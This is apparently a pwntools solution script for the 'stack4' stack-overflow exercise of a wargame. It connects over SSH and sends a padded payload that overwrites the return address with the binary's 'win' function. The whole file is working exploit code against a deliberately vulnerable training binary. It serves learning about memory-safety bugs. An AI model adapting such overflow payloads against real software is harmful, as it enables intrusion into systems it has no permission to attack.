from pwn import *

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.SSH_PORT))

e = ELF('bins/stack4')
win_addr = e.symbols['win']
log.info('win_addr: %08x', win_addr)

pad = 'P'*8  # pad/align & 0xf
ebp = 'B'*4  # ebp value saved by main()
payload = flat(['A'*64, pad, ebp, p32(win_addr)])

p = s.system(args.BIN)
p.sendline(payload)

ret = p.recvline()
assert ret == 'code flow successfully changed\n'
